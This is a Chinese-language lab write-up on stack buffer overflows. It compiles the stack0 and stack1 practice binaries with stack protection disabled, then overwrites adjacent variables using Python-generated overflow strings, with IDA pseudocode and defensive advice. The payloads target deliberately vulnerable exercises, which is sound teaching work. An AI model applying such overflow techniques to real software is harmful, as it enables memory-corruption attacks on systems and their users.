# 栈溢出实验1

## 实验概述

### 【目的】
1. 通过-fno-stack-protector和-m32参数从gcc编译stack0.c文件。
2. 运行编译后的程序，通过缓冲区溢出修改与字符串数组相邻的变量，得到输出"you have changed the 'modified' variable"
3. 运行stack1程序，通过栈溢出得到输出"you have correctly got the variable to the right value"
### 【环境】
Linux
### 【工具】
gcc，python，IDA pro，binwalk
### 【原理】
缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。
## 实验步骤

### 【步骤】
#### stack0
打开shell，使用-fno-stack-protector参数编译stack0。
```sh
$ gcc stack0.c -o stack0 -fno-stack-protector -m32
stack0.c: In function ‘main’:
stack0.c:11:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(buffer);
   ^
/tmp/ccccxHmM.o: In function `main':
stack0.c:(.text+0x23): warning: the `gets' function is dangerous and should not be used.
```
观察源代码，发现buffer数组与modified变量相邻，要使modified变量不等于0，才能得到输出"you have changed the 'modified' variable"
因为有gets()函数，我们可以向栈上不加限制的写入任意长度的数据，当输入数据大于64时，便发生了溢出，输入数据只要够大，就一定能覆盖到modifiel变量。

这里我们使用python简化输入，免去手打一大堆字符的麻烦。
```sh
$ python -c "print 'A'*65" | ./stack0
you have changed the 'modified' variable
Segmentation fault (core dumped)
```

#### stack1
用binwalk分析程序结构。
```
$ binwalk stack1

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)

```
发现是32位程序，直接拖进idaq.exe，定位到main函数，按F5生成伪代码。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest; // [sp+0h] [bp-4Ch]@3
  int v5; // [sp+40h] [bp-Ch]@3
  int *v6; // [sp+48h] [bp-4h]@1

  v6 = &argc;
  if ( argc == 1 )
    errx(1, "please specify an argument\n");
  v5 = 0;
  strcpy(&dest, argv[1]);
  if ( v5 == 'abcd' )
    puts("you have correctly got the variable to the right value");
  else
    printf("Try again, you got 0x%08x\n", v5);
  return 0;
}
```
可以看到这里把作为参数的字符串复制到了变量dest上：`strcpy(&dest, argv[1]);`
那么我们在运行程序时给出超过dest字符数组长度的参数即可发生溢出，这里我们需要覆盖v5等于`"abcd"`。
经过计算，有：
```
$ python -c "print 'A'*64+'\x64\x63\x62\x61'" | xargs ./stack1
you have correctly got the variable to the right value

```
这里的 xargs 表示输入数据作为参数。


### 【总结】

本次实验主要体验Linux环境下栈溢出的发生场景，并尝试通过栈溢出覆盖（修改）相邻的变量，达到改变程序执行流的目的。
可以发现，要使栈溢出发生，要满足以下条件：


- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。

